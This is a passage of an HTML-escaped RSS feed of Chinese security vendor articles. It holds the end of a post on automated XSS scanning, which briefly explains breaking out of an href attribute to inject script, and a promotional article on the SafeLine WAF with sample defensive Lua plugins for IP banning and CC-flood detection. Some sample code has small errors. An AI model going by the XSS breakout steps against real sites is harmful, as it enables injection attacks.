Code&lt;/li&gt;&lt;li&gt;URL Encode&lt;/li&gt;&lt;li&gt;js string      literal&lt;/li&gt;&lt;li&gt;GBK&lt;/li&gt;&lt;li&gt;UTF-7&lt;/li&gt;&lt;li&gt;Base64&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;对于上文提到的漏洞，长亭洞鉴的发现过程会更加智能化，在理解业务的基础上进行深度分析，定位漏洞，并自动生成 Payload，简单模拟一遍，可以将发现过程简单理解如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;访问原始页面，判断输入是否会出现在页面上&lt;br&gt; 结论：参数 p 的内容会出现在页面上&lt;/li&gt;&lt;li&gt;根据 HTML 的语义建立 DOM 结构，判断输出在 DOM 中的位置&lt;br&gt; 结论：输出位于 a 标签的 href 属性中&lt;/li&gt;&lt;li&gt;输出是否需要冲突破闭合&lt;br&gt; 结论：href 属性在双引号内，因此需要使用 &quot; 突破闭合，也可以进一步使用 &amp;gt; 突破标签闭合&lt;/li&gt;&lt;li&gt;是否能插入可执行的 js&lt;br&gt; 结论：不存在其他干扰标签，可以使用 &quot; 突破闭合后插入标签事件或插入新的标签&lt;/li&gt;&lt;li&gt;基本确定 XSS 漏洞存在，开始尝试自动生成 Payload，生成 Payload 时需要考虑&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;洞鉴扫描截图如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;正在扫描的任务详情部分截取&lt;br&gt; &lt;/li&gt;&lt;/ol&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1bea0d6546081eeeb1f4d0f444d97b97_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;260&quot; class=&quot;content_image&quot; width=&quot;415&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1bea0d6546081eeeb1f4d0f444d97b97_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;260&quot; class=&quot;content_image lazy&quot; width=&quot;415&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-1bea0d6546081eeeb1f4d0f444d97b97_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;2. XSS 漏洞详情部分截取&lt;br&gt; &lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d577ff408f931064564c12b3d0ffd5f7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;327&quot; class=&quot;content_image&quot; width=&quot;415&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d577ff408f931064564c12b3d0ffd5f7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;415&quot; data-rawheight=&quot;327&quot; class=&quot;content_image lazy&quot; width=&quot;415&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d577ff408f931064564c12b3d0ffd5f7_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;传统的 XSS 扫描简单粗暴，无法实现“全面发现 XSS 漏洞”的目标。&lt;/p&gt;&lt;p&gt;长亭洞鉴集成了基于智能化场景分析算法的扫描引擎，可以精确定位参数的输出，覆盖不同场景的多种 XSS 漏洞，从而实现对 XSS 漏洞进行快速、深度、精准地探测。&lt;/p&gt;&lt;p&gt;感兴趣的同学可以打开长亭官网点击试用，了解更多的产品详情。&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2019-01-12-54732352</guid>
<pubDate>Sat, 12 Jan 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>2019年，你的 WAF 能应对场景化安全风险了吗？</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-28-53566289.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/53566289&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f480892a5e5eab4b7bd702e1d671ec06_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/ef1451b56363510f1213945e82c5e076&quot; data-hash=&quot;ef1451b56363510f1213945e82c5e076&quot; data-hovercard=&quot;p$b$ef1451b56363510f1213945e82c5e076&quot;&gt;@Monster&lt;/a&gt; &lt;/p&gt;&lt;p&gt;羊毛党、恶意用户、爬虫、数据泄露、暴力破解、撞库……2019年了，你的 WAF 能应对场景化安全风险了吗？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;甲方，不量身定制能否“完美解决”&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;2018 年马上要过去了，回顾今年网络安全环境，最惹人注目的依然是 Web 安全。&lt;/b&gt;今年的 Web 安全事件仍旧大量充斥着诸如 SQL 注入、XSS、XXE、反序列化等传统的 Web 漏洞，除此之外还有横行的CC攻击、频发的0day漏洞以及企业自身业务导致的逻辑漏洞等等。&lt;/p&gt;&lt;p&gt;业务形态不同形成的多样技术架构，对于企业的安全建设者来说，几乎没有任何一个 Web 安全产品能够“完美解决”以上风险。事实上“完美解决”是个伪命题，安全本来就是一个道高一尺魔高一丈的博弈对抗问题，&lt;b&gt;每个企业的业务场景和内部网络拓扑都有着巨大的差异，很难找到和自家公司业务场景相似，又有着同样的安全需求的其他企业，即使找到，别人家的解决方案照搬过来不一定对自家环境适用。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;我等乙方，必须要叠加功能才能解决问题吗？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;多年来，行业内把WAF作为解决 Web 安全问题的必选方案，一个企业但凡有较为重要的业务网站就必然有 WAF 为其保驾护航。WAF市场依然呈现增速，而如今面临新的安全威胁、场景化的业务安全需求，传统 WAF 产品已经越来越不能满足现代化网络环境的安全防护需求。&lt;/p&gt;&lt;p&gt;对我等乙方而言，ToB 产品的难点在于不同的客户有不同的应用场景，很难有一款产品能解决所有客户的需求。&lt;b&gt;想让甲方爸爸满意，必然需要做深度定制化，但是如果漫无止境地根据客户的需求增加功能，会给产品设计与使用体验带来巨大的灾难，&lt;/b&gt;最终可能产生一个具有上千功能的产品，只有完全熟悉这上千项功能的使用者才能快速找到在某个场景下能有效工作的选项组合。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2dbe524ba5b9a72d20b62c259204385a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;716&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic3.zhimg.com/v2-2dbe524ba5b9a72d20b62c259204385a_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2dbe524ba5b9a72d20b62c259204385a_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;716&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic3.zhimg.com/v2-2dbe524ba5b9a72d20b62c259204385a_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-2dbe524ba5b9a72d20b62c259204385a_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;场景化安全风险重难点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;目前为止，许多传统安全问题已经有了不少合适解决方案，但是非典型漏洞带来的风险变成了让甲方安全部头疼的新问题。有经验的安全工作者可以快速发现一个系统中是否存在一些非典型漏洞带来的风险，但是这种风险在不同的场景中的表现形式都不一样（比如怎么发现一个支付业务的 0 元购买风险，怎么防止一个管理系统的水平或垂直越权问题），因此无法形成合理的方法论，使该方法可以被自动化进行大面积统一排查。&lt;/p&gt;&lt;p&gt;&lt;b&gt;综上所述，许多问题看起来类似，但是无法找到一个通用的解决方案可以在不同的业务场景下都能解决问题。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;流量分析的需求&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当今大数据时代，在中大型网络环境中，每天产生原始事件上亿次，告警的次数也在百万级别，这些数据加以分析和处理能够解开许多传统安全产品无法解决的难题。但是这样的原始数据不可能靠人工梳理，因此自动化日志或流量分析变成了一个强需求，亟需更新。&lt;/p&gt;&lt;p&gt;大多数研发实力较强的企业，纷纷开始尝试使用 Storm、ELK、Splunk 等开源系统建立自己的大数据平台，并且得到了不错的落地。如上文所言，如今的 Web 安全环境下除了传统的 Web 漏洞还有大量的业务安全、0Day 漏洞、CC 攻击等风险，&lt;b&gt;为了解决这些新型的安全威胁，一些企业建立了自己的 SOC、SIEM、风控系统、势态感知，从多个平台中收集告警、日志或流量，进行综合整理、深度分析，从而可以对业务建模，量化风险，并发现恶意行为与恶意用户。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-99b3b4064687db38a3325b1e767f10b8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;665&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic1.zhimg.com/v2-99b3b4064687db38a3325b1e767f10b8_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-99b3b4064687db38a3325b1e767f10b8_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;665&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic1.zhimg.com/v2-99b3b4064687db38a3325b1e767f10b8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-99b3b4064687db38a3325b1e767f10b8_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;用WAF做流量分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;研发实力较强的企业通过使用一些开源系统来建立自己的大数据平台进行流量分析，但这也存在不小的技术挑战，同时需要投入大量的人力物力才能看到一些实际的效果。&lt;/p&gt;&lt;p&gt;&lt;b&gt;而 WAF 作为各企业居家常备产品，作为 Web 流量处理网关有着天然的数据优势，用 WAF 辅助完成流量分析的做法由来已久。&lt;/b&gt;一些传统 WAF 会通过 SYSLOG 主动向其他平台推送告警，能够达到其他平台联动的效果，但其实效果微乎其微。日志是静态的，WAF 是动态的，推送出去的日志只是一个单一的结果，并没有记录 WAF 对于 HTTP 请求处理的所有细节，而这些丢失的细节中蕴藏着巨大的能量。因此，单纯对外推送告警反而大大限制了WAF的发挥。&lt;/p&gt;&lt;p&gt;&lt;b&gt;如果站在WAF 自身就是一个流量分析平台的角度，WAF其实可以自己做流量分析，实现业务建模、风险建模。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;使用 WAF 做流量分析的常见问题如下：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;1. 流量处理平台需要大量的日志和流量，怎么办？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;WAF 作为 Web 网关，有全量的 HTTP 数据&lt;/p&gt;&lt;p&gt;&lt;b&gt;2. 流量分析平台怎么部署？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;WAF 本身就是攻击检测平台，同样也可以作为流量分析平台&lt;/p&gt;&lt;p&gt;&lt;b&gt;3. 流量分析是不是需要复杂的算法？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;WAF 可以提供常见的业务场景适配算法，结合 Web 安全，更加适用&lt;/p&gt;&lt;p&gt;&lt;b&gt;4. 流量分析可能会消耗非常多的计算资源，怎么办？&lt;/b&gt;&lt;/p&gt;&lt;p&gt; WAF 进行集群化部署。单机性能不够就上集群，集群性能不够就上更大的集群&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;WAF的流量分析可以解决什么问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;长亭科技的下一代WAF产品雷池（SafeLine）从设计之初就对开放性与扩展性给予了非常高的重视。&lt;/b&gt;最新发布的雷池版本，开放了所有的管理控制接口，提供了可集群化部署的离线流量分析引擎，支持以更多自定义的方式处理经过的 HTTP 流量。使用者可以通过 Restful API 的方式调用雷池的所有管理控制功能，也可以使用 Lua 语言自主编写雷池（SafeLine）插件完成场景化的流量分析逻辑。&lt;/p&gt;&lt;p&gt;过去的一年，作为 WAF 供应商，长亭科技与客户合作解决了许多场景化的安全问题，从以下几个例子可以看出，&lt;b&gt;除了传统 Web 攻击防护以外，下一代WAF还可以做的事情还有：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;与风控系统深度集成联合打击羊毛党&lt;/p&gt;&lt;p&gt;结合威胁情报平台对恶意用户进行实时封堵&lt;/p&gt;&lt;p&gt;监控敏感接口的爬取行为，多维度防御数据泄露&lt;/p&gt;&lt;p&gt;跟踪攻击者的行为，定位网站实际存在的漏洞&lt;/p&gt;&lt;p&gt;定制复杂的 CC 防护策略，保障服务的 SLA&lt;/p&gt;&lt;p&gt;防暴力破解、防撞库&lt;/p&gt;&lt;p&gt;定制 Web 请求与防护统计，生成势态感知报告&lt;/p&gt;&lt;p&gt;……以及各种基于企业自身业务场景需求而可能产生的应用&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;介绍插件处理机制&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;目前雷池支持三种插件类型：请求处理插件、定时任务插件、统计分析插件。&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;请求处理插件&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;请求处理插件可以通过指定筛选条件的方式过滤出符合某种特征（如源 IP、域名、URL 等）的 HTTP 请求，并对这些请求逐条进行处理。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;以一个简单的业务场景为例，&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//www.chaitin.cn/sso&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chaitin.cn/sso&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; 是一个敏感的统一认证接口，长期遭到爆破与撞库的威胁，某客户希望将雷池与威胁情报服务进行集成，对访问该统一认证接口的用户进行风险分析，若威胁情报平台认为当前用户具有恶意就立即阻断该用户的后续访问。&lt;/p&gt;&lt;p&gt;&lt;b&gt;了解如上的业务场景需求后可以按这样的方式编写插件：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;1. 使用 match 变量进行筛选，过滤所有访问统一认证接口的 HTTP 请求&lt;/p&gt;&lt;p&gt;2. 注册一个回调函数，当用户访问统一认证接口时将 HTTP 请求传入回调函数进行处理&lt;/p&gt;&lt;p&gt;3. 与威胁情报平台联动，判断访问者是否有攻击背景&lt;/p&gt;&lt;p&gt;4. 发现恶意用户后下发规则，阻断该用户的后续访问&lt;/p&gt;&lt;p&gt;样例插件代码如下：&lt;/p&gt;&lt;p&gt;local safeline = require &quot;safeline&quot;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;header = {}&lt;/p&gt;&lt;p&gt;header[&quot;User-Agent&quot;] = &quot;safeline&quot;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;bantime = 60&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;-- 威胁情报平台地址&lt;/p&gt;&lt;p&gt;url = &quot;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//xx.xx.xx.xx/query%3FapiKey%3Dxxxxxxxxxxxxxxx%26src%3D%25s&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xx.xx.xx.xx/query?&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;apiKey=xxxxxxxxxxxxxxx&amp;amp;src=%s&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&quot;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;match = {&lt;/p&gt;&lt;p&gt;    ip = &quot;0.0.0.0/0&quot;,&lt;/p&gt;&lt;p&gt;    host    = &quot;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//www.chaitin.cn&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;chaitin.cn&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&quot;,&lt;/p&gt;&lt;p&gt;    urlpath = &quot;/sso&quot;,&lt;/p&gt;&lt;p&gt;    type = skynet.MATCH_TYPE_ALL,&lt;/p&gt;&lt;p&gt;}&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;function action(ip, resp)&lt;/p&gt;&lt;p&gt;  local banip = {&lt;/p&gt;&lt;p&gt;      ip = ip,&lt;/p&gt;&lt;p&gt;  }&lt;/p&gt;&lt;p&gt;  if string.find(resp, &quot;badboy&quot;) ~= nil then&lt;/p&gt;&lt;p&gt;    safeline.action_ban(banip, bantime)&lt;/p&gt;&lt;p&gt;  end&lt;/p&gt;&lt;p&gt;end&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;function process(ip, host, urlpath)&lt;/p&gt;&lt;p&gt;    urltmp = string.format(url, ip)&lt;/p&gt;&lt;p&gt;        resp, err = safeline.http_get(urltmp, header)&lt;/p&gt;&lt;p&gt;    action(ip, resp[&quot;body&quot;])&lt;/p&gt;&lt;p&gt;end&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;safeline.register(safeline.TYPE_PROCESS, match, process)&lt;/p&gt;&lt;p&gt;插件运行结果如下图：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-62a170c9a4539505607620c4e4301877_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;547&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-62a170c9a4539505607620c4e4301877_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-62a170c9a4539505607620c4e4301877_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;547&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic4.zhimg.com/v2-62a170c9a4539505607620c4e4301877_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-62a170c9a4539505607620c4e4301877_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;封禁列表如下：&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-38d757a6d3dcc8655bde0339e27131be_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;535&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-38d757a6d3dcc8655bde0339e27131be_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-38d757a6d3dcc8655bde0339e27131be_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;535&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;864&quot; data-original=&quot;https://pic3.zhimg.com/v2-38d757a6d3dcc8655bde0339e27131be_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-38d757a6d3dcc8655bde0339e27131be_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;定时任务插件&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;定时任务插件会周期性的触发，持续输出用户定制的场景化统计分析需求。&lt;/b&gt;如某用户了解当前商城的订单情况，并绘制出订单趋势图，可以根据如下思路编写插件：&lt;/p&gt;&lt;p&gt;1. 注册一个每 10 秒触发一次的回调函数&lt;/p&gt;&lt;p&gt;2. 在回调函数内统计 10 秒内对订单支付接口的访问情况&lt;/p&gt;&lt;p&gt;3. 将统计结果推送到监控大屏&lt;/p&gt;&lt;p&gt;样例插件代码如下：&lt;/p&gt;&lt;p&gt;local safeline = require &quot;safeline&quot;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;local duration = 10&lt;/p&gt;&lt;p&gt;-- 每 10 秒调用一次&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;local pay = {&lt;/p&gt;&lt;p&gt;  host = &quot;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//order.chaitin.cn&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;order.chaitin.cn&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&quot;,&lt;/p&gt;&lt;p&gt;  urlpath = &quot;/pay&quot;&lt;/p&gt;&lt;p&gt;}&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;function tick(dur)&lt;/p&gt;&lt;p&gt;cnt = safeline.stat_visit(pay, 10)&lt;/p&gt;&lt;p&gt;safeline.http_post(&quot;&lt;a href=&quot;http://link.zhihu.com/?target=http%3A//xx.xx.xx.xx/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;xx.xx.xx.xx/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&quot;, {pay = cnt})&lt;/p&gt;&lt;p&gt;end&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;safeline.register(safeline.TYPE_TICKER, duration, tick)&lt;/p&gt;&lt;h2&gt;&lt;b&gt;统计分析插件&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;雷池 2.0 在原有流量处理引擎的基础上增加了流式流量处理算法，&lt;/b&gt;离线统计分析引擎支持以定制化 SQL 语句的方式进行查询和统计，当 SQL 语句产生结果时回调函数会被触发，查询结果会做为参数传入回调函数。这样通过 SQL 将流量运算逻辑语义化，&lt;b&gt;大大改善了统计分析算法的处理效率与实现难度。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;雷池内置了常见 CC 攻击防护算法，但是对于敏感业务总会有高级别攻击者为其量身定制 CC 攻击策略。某用户在遭遇 CC 攻击后进行了全面复盘，定位到了业务的脆弱部分，同时也发现了攻击者的攻击思路，总结复盘结果后为了防止此类公司再次发生，该用户需要写雷池插件来长期解决问题。&lt;/p&gt;&lt;p&gt;&lt;b&gt;插件思路如下：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;1. 攻击者会发起频率较高的 HTTP Flood&lt;/p&gt;&lt;p&gt;2. 攻击者会批量使用代理服务器来伪造攻击源 IP&lt;/p&gt;&lt;p&gt;3. 攻击者会大量访问站点的搜索接口，由于业务特性，该接口会持续消耗服务器计算资源&lt;/p&gt;&lt;p&gt;4. 被攻击时搜索接口的处理延迟明显增高&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如此复杂的 CC 攻击场景只需要一条 SQL 就可以精准定位攻击者并实施阻断，样例插件代码如下：&lt;/p&gt;&lt;p&gt;local safeline = require &quot;safeline&quot;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;local query = [[&lt;/p&gt;&lt;p&gt;        SELECT&lt;/p&gt;&lt;p&gt;                TUMBLE_WINDOW(timestamp, 1) AS timestamp,&lt;/p&gt;&lt;p&gt;                ip,&lt;/p&gt;&lt;p&gt;                COUNT(ip) AS count_ip,&lt;/p&gt;&lt;p&gt;        FROM access_log&lt;/p&gt;&lt;p&gt;        WHERE url_path=&quot;/search&quot; and time &amp;gt; 0.2&lt;/p&gt;&lt;p&gt;        GROUP BY timestamp, ip&lt;/p&gt;&lt;p&gt;        HAVING count_ip &amp;gt; 2000&lt;/p&gt;&lt;p&gt;        ORDER BY count_ip desc&lt;/p&gt;&lt;p&gt;]]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;function process(key, rows)&lt;/p&gt;&lt;p&gt;    for _, r in iparis(rows) do&lt;/p&gt;&lt;p&gt;        safeline.ban(r[&quot;ip&quot;])&lt;/p&gt;&lt;p&gt;    end&lt;/p&gt;&lt;p&gt;end&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;skynet.register(safeline.TYPE_QUERY, query, process)&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;此类的业务场景千千万，通过雷池插件进行统计分析可以避免对业务系统频繁改动，实现以极低的成本解决实际场景化的业务安全问题。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;figure&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-88d9ae4cc2e48752c5812d92a7dfe9db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;608&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1080&quot; data-original=&quot;https://pic4.zhimg.com/v2-88d9ae4cc2e48752c5812d92a7dfe9db_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-88d9ae4cc2e48752c5812d92a7dfe9db_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;608&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1080&quot; data-original=&quot;https://pic4.zhimg.com/v2-88d9ae4cc2e48752c5812d92a7dfe9db_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-88d9ae4cc2e48752c5812d92a7dfe9db_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;目前，长亭科技已与多家互联网公司、金融机构、大型传统企业达成了战略合作，&lt;/b&gt;不断为企业输出安全能力，在辅助企业解决安全问题的同时也累积了大量的场景化业务安全处理经验，并通过流量分析插件为诸多企业解决了实际环境中遇到的场景化安全问题。未来，长亭科技将持续探索前沿技术思路，及时追踪用户反馈，切实为不同类型的企业解决实际遇到的安全难题，以优质的产品和服务为企业安全保驾护航。&lt;/p&gt;&lt;p&gt;&lt;b&gt;更多关于雷池开放平台的细节可以关注： &lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//github.com/chaitin/safeline-open-platform&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/safe&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;line-open-platform&lt;/span&gt;&lt;span 